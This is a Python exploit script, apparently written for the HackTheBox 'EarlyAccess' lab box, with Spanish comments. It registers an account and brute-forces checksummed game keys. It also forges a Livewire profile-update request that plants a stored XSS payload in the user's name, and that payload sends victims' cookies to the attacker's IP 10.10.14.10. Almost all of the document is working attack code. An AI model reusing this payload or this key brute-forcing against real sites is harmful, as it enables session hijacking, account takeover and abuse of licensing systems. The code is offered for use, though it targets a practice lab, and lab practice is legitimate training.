#!/usr/bin/python3
import requests
import time
from pwn import *
import pdb
import sys
import json
import html


requests.packages.urllib3.disable_warnings()


# Variables Globales
name = "pr1ngl3s"
email = "pr1ngl3s@pr1ngl3s.com"
password = "pr1ngl3s123"
password2 = "pr1ngl3s123"
url_login = "https://earlyaccess.htb/login"

s = requests.session()


r = s.get(url_login, verify=False)

token = re.findall('name="_token" value="(.*?)"',r.text)[0]


def checksum_calc(key):
	gs = key.split('-')[:]
	return sum([sum(bytearray(g.encode())) for g in gs])

def Key_Gen():
	values = calc_g3()

	total_keys = []

	for x in values:
		key = f"KEY98-KY5Z3-{x}-GAML8-"
		cs = checksum_calc(key)
		key = key + str(cs)

		total_keys.append(key)

	try_keys(total_keys)

def try_keys(keys):

	key_verify_url = "https://earlyaccess.htb/key/add"

	p1 = log.progress("Ataque de fuerza bruta")

	p1.status("Iniciando ataque de fuerza bruta...")

	time.sleep(2)

	cont = 1

	for key in keys:

		url_token = "https://earlyaccess.htb/login"

		p1.status("Probando con la %s de [%d/60]" % (key,cont))

#		r = s.get(url_key, cookies=cookies, verify=False)

#		token = re.findall('name="_token" value="(.*?)"',r.text)[0]

		data_post = {
			'_token': token,
			'key': key
		}

		r = s.post(key_verify_url, verify=False, data=data_post)

		time.sleep(1)

		if "Game-key is invalid!" not in r.text:
			p1.status("La key %s ha sido registrada con exito" % key)
			break

		cont += 1

def Register():

	url_register = "https://earlyaccess.htb/register"

	r = s.get(url_register, verify=False)

	token = re.findall('name="_token" value="(.*?)"',r.text)[0]

	data_post = {
		'_token': token,
		'name': name,
		'email': email,
		'password': password,
		'password_confirmation': password2
	}

	r = s.post(url_register, data=data_post, verify=False)


def Login():
	url_login = "https://earlyaccess.htb/login"

	data_post = {
		'_token': token,
		'email': email,
		'password': password
	}

	r = s.post(url_login, data=data_post, verify=False)

def Update_name(old_name,new_name):
	url_update = "https://earlyaccess.htb/livewire/message/profile.update-profile-information-form"

	url_profile = "https://earlyaccess.htb/user/profile"

	r = s.get(url_profile, verify=False)

	token = re.findall('name="_token" value="(.*?)"',r.text)[0]

	id = re.findall('id&quot;:&quot;(.*?)&quot;', r.text)[1]

	data_id = int(re.findall('state&quot;:{&quot;id&quot;:(.*?),&quot;',r.text)[0])

	htmlHash = re.findall('htmlHash&quot;:&quot;(.*?)&quot;', r.text)[1]

	checksum = re.findall('checksum&quot;:&quot;(.*?)&quot;', r.text)[1]

	created_at = re.findall('created_at&quot;:&quot;(.*?)&quot;', r.text)[0]

	updated_at = re.findall('updated_at&quot;:&quot;(.*?)&quot;', r.text)[0]

	headers = {"Content-Type":"application/json","X-Csrf-Token":token}

	data_post = {
	    "fingerprint":{
	        "id":id,
	        "name":"profile.update-profile-information-form",
	        "locale":"en",
	        "path":"user/profile",
	        "method":"GET"
	    },
	    "serverMemo":{
	        "children":[],
	        "errors":[],
	        "htmlHash":htmlHash,
	        "data":{
	            "state":{
	                "id":data_id,
	                "name":old_name,
	                "email":"pr1ngl3s@pr1ngl3s.com",
	                "role":"user",
	                "key":None,
	                "created_at":created_at,
	                "updated_at":updated_at
	            },
	            "photo":None
	        },
	        "dataMeta":[],
	        "checksum":checksum
	    },
	    "updates":[
	        {
	            "type":"syncInput",
	            "payload":{
	                "name":"state.name",
	                "value": new_name
	            }
	        },
	        {
	            "type":"callMethod",
	            "payload":{
	                "method":"updateProfileInformation",
	                "params":[]
	            }
	        }
	    ]
	}

	json_data_post = json.dumps(data_post)

	r = s.post(url_update, data=json_data_post,headers=headers, verify=False)

def XSS_Cookie_Hijacking():

	url__send_message= "https://earlyaccess.htb/contact"

	Update_name("<script>document.location='http://10.10.14.10/?c='+document.cookie</script>","pr1ngl3s")




if __name__ == "__main__":

	Register()

	Login()

	XSS_Cookie_Hijacking()







#	Key_Gen()

#	panel_admin()


